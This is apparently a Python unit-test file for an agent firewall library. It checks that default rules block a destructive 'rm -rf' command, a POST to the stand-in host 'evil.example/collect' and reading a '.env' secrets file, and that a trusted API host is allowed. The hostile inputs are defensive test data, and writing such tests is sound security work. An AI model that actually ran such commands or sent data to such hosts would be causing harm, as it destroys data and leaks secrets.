import unittest

from agentfirewall import (
    AgentFirewall,
    DecisionAction,
    EventContext,
    FirewallConfig,
    GuardedFileAccess,
    InMemoryAuditSink,
    PolicyEngine,
    protect,
)
from agentfirewall.enforcers import GuardedHttpClient, GuardedSubprocessRunner
from agentfirewall.exceptions import FirewallViolation
from agentfirewall.rules import default_runtime_rules


class PackageTests(unittest.TestCase):
    def test_protect_returns_original_agent(self) -> None:
        class DummyAgent:
            pass

        agent = DummyAgent()

        protected = protect(agent)

        self.assertIs(protected, agent)
        self.assertIsInstance(agent.__agentfirewall__, AgentFirewall)

    def test_wrap_agent_returns_original_agent(self) -> None:
        class DummyAgent:
            pass

        agent = DummyAgent()
        firewall = AgentFirewall()

        wrapped = firewall.wrap_agent(agent)

        self.assertIs(wrapped, agent)
        self.assertIs(agent.__agentfirewall__, firewall)

    def test_evaluate_uses_default_action_when_no_rule_matches(self) -> None:
        firewall = AgentFirewall()

        decision = firewall.evaluate(EventContext(kind="tool_call"))

        self.assertEqual(decision.action, DecisionAction.ALLOW)

    def test_builtin_command_rule_blocks_dangerous_command(self) -> None:
        firewall = AgentFirewall(
            policy=PolicyEngine(rules=default_runtime_rules())
        )

        decision = firewall.evaluate(
            EventContext.command("rm -rf /tmp/demo && echo done")
        )

        self.assertEqual(decision.action, DecisionAction.BLOCK)
        self.assertEqual(decision.rule, "block_dangerous_command")

    def test_log_only_mode_converts_block_to_log(self) -> None:
        firewall = AgentFirewall(
            config=FirewallConfig(log_only=True),
            policy=PolicyEngine(rules=default_runtime_rules()),
        )

        decision = firewall.evaluate(
            EventContext.command("rm -rf /tmp/demo && echo done")
        )

        self.assertEqual(decision.action, DecisionAction.LOG)
        self.assertEqual(decision.metadata["original_action"], "block")

    def test_audit_sink_records_decision(self) -> None:
        audit_sink = InMemoryAuditSink()
        firewall = AgentFirewall(audit_sink=audit_sink)

        firewall.evaluate(EventContext(kind="tool_call"))

        self.assertEqual(len(audit_sink.entries), 1)
        self.assertEqual(audit_sink.entries[0].decision.action, DecisionAction.ALLOW)

    def test_subprocess_runner_blocks_before_execution(self) -> None:
        calls: list[object] = []

        def fake_runner(*args, **kwargs):
            calls.append((args, kwargs))
            return "ran"

        firewall = AgentFirewall(
            policy=PolicyEngine(rules=default_runtime_rules())
        )
        runner = GuardedSubprocessRunner(firewall=firewall, runner=fake_runner)

        with self.assertRaises(FirewallViolation):
            runner.run("rm -rf /tmp/demo && echo done", shell=True)

        self.assertEqual(calls, [])

    def test_http_client_blocks_untrusted_host_before_request(self) -> None:
        calls: list[object] = []

        def fake_opener(request, **kwargs):
            calls.append((request, kwargs))
            return "opened"

        firewall = AgentFirewall(
            policy=PolicyEngine(
                rules=default_runtime_rules(trusted_hosts=("api.openai.com",))
            )
        )
        client = GuardedHttpClient(firewall=firewall, opener=fake_opener)

        with self.assertRaises(FirewallViolation):
            client.request("https://evil.example/collect", method="POST")

        self.assertEqual(calls, [])

    def test_http_client_allows_trusted_host(self) -> None:
        calls: list[object] = []

        def fake_opener(request, **kwargs):
            calls.append((request.full_url, kwargs))
            return "opened"

        firewall = AgentFirewall(
            policy=PolicyEngine(
                rules=default_runtime_rules(trusted_hosts=("api.openai.com",))
            )
        )
        client = GuardedHttpClient(firewall=firewall, opener=fake_opener)

        result = client.request("https://api.openai.com/v1/models")

        self.assertEqual(result, "opened")
        self.assertEqual(calls[0][0], "https://api.openai.com/v1/models")

    def test_file_access_blocks_sensitive_path_before_open(self) -> None:
        calls: list[object] = []

        def fake_open(*args, **kwargs):
            calls.append((args, kwargs))
            return "opened"

        firewall = AgentFirewall(
            policy=PolicyEngine(rules=default_runtime_rules())
        )
        files = GuardedFileAccess(firewall=firewall, opener=fake_open)

        with self.assertRaises(FirewallViolation):
            files.open(".env", "r")

        self.assertEqual(calls, [])


if __name__ == "__main__":
    unittest.main()
